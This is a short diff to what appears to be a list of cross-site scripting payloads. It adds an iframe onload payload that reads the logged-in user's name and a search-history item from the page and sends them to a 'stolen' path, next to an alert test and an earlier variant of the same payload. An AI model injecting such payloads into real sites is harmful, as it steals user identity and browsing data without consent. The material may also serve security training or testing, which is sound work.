@@ -2,3 +2,5 @@
 <IFRAME SRC=# onload="alert(0)"></IFRAME>
 
 <IFRAME SRC=# onload='$(document).ready(location.pathname="stolen?user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text())'></IFRAME>
+
+<IFRAME SRC=# onload='location.pathname="stolen?user=" + $("#logged-in-user").text() + "&last_search=" + $("#history-list .history-item:eq(1)").text()'></IFRAME>
